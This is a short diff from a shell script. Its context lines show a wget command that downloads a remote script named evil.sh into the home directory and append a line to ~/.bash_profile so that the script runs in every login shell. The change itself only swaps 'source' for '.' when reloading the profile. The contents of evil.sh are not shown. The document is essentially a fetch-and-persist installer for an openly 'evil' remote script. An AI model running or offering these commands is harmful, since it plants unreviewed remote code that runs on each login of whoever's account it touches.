@@ -6,4 +6,4 @@ wget 'https://raw.githubusercontent.com/lustered/evil.sh/master/evil.sh' -P ~/
 echo "[[ -f ~/evil.sh ]] && . ~/evil.sh" >> ~/.bash_profile
 
 # Source file
-source ~/.bash_profile
+. ~/.bash_profile
